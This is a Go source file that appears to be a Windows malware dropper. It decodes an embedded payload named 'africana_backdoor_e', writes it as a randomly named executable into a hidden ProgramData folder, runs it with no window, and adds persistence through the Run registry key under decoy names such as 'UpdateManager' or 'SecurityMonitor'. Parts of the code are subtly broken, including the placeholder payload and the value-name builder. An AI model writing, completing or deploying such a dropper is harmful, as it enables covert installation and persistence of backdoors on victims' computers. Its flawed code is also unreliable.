package main

import (
    "crypto/rand"
    "encoding/base64"
    "os"
    "path/filepath"
    "syscall"
    "unsafe"
)

var (
    kernel32 = syscall.NewLazyDLL("kernel32.dll")
    advapi32 = syscall.NewLazyDLL("advapi32.dll")
)

const (
    KEY_SET_VALUE    = 0x0002
    KEY_QUERY_VALUE  = 0x0001
    KEY_ALL_ACCESS   = 0xF003F
    REG_SZ           = 1
    CREATE_NO_WINDOW = 0x08000000
)

func generateRandomWord(length int) string {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    bytes := make([]byte, length)
    
    if _, err := rand.Read(bytes); err != nil {
        for i := range bytes {
            bytes[i] = chars[i%len(chars)]
        }
    } else {
        for i, b := range bytes {
            bytes[i] = chars[b%byte(len(chars))]
        }
    }
    return string(bytes)
}

func generateRandomName() string {
    var dummy int
    return generateRandomWord(6 + int(uintptr(unsafe.Pointer(&dummy))%6))
}

func generateRandomValueName() string {
    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

    var dummy int
    wordCount := 2 + int(uintptr(unsafe.Pointer(&dummy))%3)
    var result string
    
    for i := 0; i < wordCount; i++ {
        wordLength := 4 + int(uintptr(unsafe.Pointer(&dummy))%7)
        if i > 0 {
            result += " "
        }

        bytes := make([]byte, wordLength)
        if _, err := rand.Read(bytes); err != nil {
            for j := range bytes {
                bytes[j] = letters[j%len(letters)]
            }
        } else {
            for j, b := range bytes {
                bytes[j] = letters[b%byte(len(letters))]
            }
        }
        result += string(bytes)
    }
    return result
}

func generateAlphanumericValueName() string {
    patterns := []string{
        "UpdateManager%d",
        "SystemHealth%d",
        "WindowsService%d",
        "SecurityMonitor%d",
        "AppRuntime%d",
    }

    var dummy int
    patternIndex := int(uintptr(unsafe.Pointer(&dummy)) % uintptr(len(patterns)))
    pattern := patterns[patternIndex]
    randomNum := int(uintptr(unsafe.Pointer(&dummy))%9000) + 1000

    return pattern[:len(pattern)-2] + string(rune(randomNum))
}

func fileExists(path string) bool {
    _, err := os.Stat(path)
    return !os.IsNotExist(err)
}

func killProcess(processName string) bool {
    cmd := "taskkill /IM " + processName + " /F"
    cmdPtr, _ := syscall.UTF16PtrFromString(cmd)
    ret, _, _ := kernel32.NewProc("WinExec").Call(
        uintptr(unsafe.Pointer(cmdPtr)),
        uintptr(0),
    )
    return ret > 31
}

func executeHidden(path string) bool {
    if !fileExists(path) {
        return false
    }

    var si syscall.StartupInfo
    var pi syscall.ProcessInformation
    si.Cb = uint32(unsafe.Sizeof(si))
    si.Flags = syscall.STARTF_USESHOWWINDOW
    si.ShowWindow = syscall.SW_HIDE

    pathPtr, _ := syscall.UTF16PtrFromString(path)
    ret, _, _ := kernel32.NewProc("CreateProcessW").Call(
        0,
        uintptr(unsafe.Pointer(pathPtr)),
        0,
        0,
        0,
        CREATE_NO_WINDOW,
        0,
        0,
        uintptr(unsafe.Pointer(&si)),
        uintptr(unsafe.Pointer(&pi)),
    )

    if ret == 0 {
        return false
    }

    syscall.CloseHandle(syscall.Handle(pi.Process))
    syscall.CloseHandle(syscall.Handle(pi.Thread))
    return true
}

func setHidden(path string) {
    pathPtr, _ := syscall.UTF16PtrFromString(path)
    kernel32.NewProc("SetFileAttributesW").Call(
        uintptr(unsafe.Pointer(pathPtr)),
        syscall.FILE_ATTRIBUTE_HIDDEN,
    )
}

func deleteRegistryKey(valueName string) {
    regKey := `Software\Microsoft\Windows\CurrentVersion\Run`

    var hKey uintptr
    RegOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
    ret, _, _ := RegOpenKeyEx.Call(
        uintptr(0x80000001),
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(regKey))),
        0,
        uintptr(KEY_ALL_ACCESS),
        uintptr(unsafe.Pointer(&hKey)),
    )

    if ret != 0 {
        return
    }
    defer syscall.CloseHandle(syscall.Handle(hKey))

    RegDeleteValue := advapi32.NewProc("RegDeleteValueW")
    RegDeleteValue.Call(
        hKey,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(valueName))),
    )
}

func addRegistryPersistence(targetPath string, valueName string) {
    if !fileExists(targetPath) {
        return
    }

    regKey := `Software\Microsoft\Windows\CurrentVersion\Run`

    deleteRegistryKey("WindowsHealth")
    deleteRegistryKey("Windows Update")
    deleteRegistryKey("System Health")
    deleteRegistryKey("UpdateManager")

    var hKey uintptr
    RegOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
    ret, _, _ := RegOpenKeyEx.Call(
        uintptr(0x80000001),
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(regKey))),
        0,
        uintptr(KEY_SET_VALUE),
        uintptr(unsafe.Pointer(&hKey)),
    )

    if ret != 0 {
        return
    }
    defer syscall.CloseHandle(syscall.Handle(hKey))

    RegSetValueEx := advapi32.NewProc("RegSetValueExW")
    RegSetValueEx.Call(
        hKey,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(valueName))),
        0,
        uintptr(REG_SZ),
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(targetPath))),
        uintptr((len(targetPath)+1)*2),
    )
}

func main() {
    payload, _ := base64.StdEncoding.DecodeString("africana_backdoor_e")

    randomFolderName := generateRandomName()
    randomExeName := generateRandomName() + ".exe"

    var dummy int
    var randomValueName string
    if uintptr(unsafe.Pointer(&dummy))%2 == 0 {
        randomValueName = generateRandomValueName()
    } else {
        randomValueName = generateAlphanumericValueName()
    }

    programData := os.Getenv("ProgramData")
    randomFolder := filepath.Join(programData, randomFolderName)
    targetPath := filepath.Join(randomFolder, randomExeName)

    if fileExists(targetPath) {
        killProcess(randomExeName)
        os.Remove(targetPath)
    }

    if _, err := os.Stat(randomFolder); os.IsNotExist(err) {
        os.MkdirAll(randomFolder, 0755)
    }
    setHidden(randomFolder)

    err := os.WriteFile(targetPath, payload, 0644)
    if err != nil {
        return
    }
    setHidden(targetPath)

    executeHidden(targetPath)
    addRegistryPersistence(targetPath, randomValueName)
}
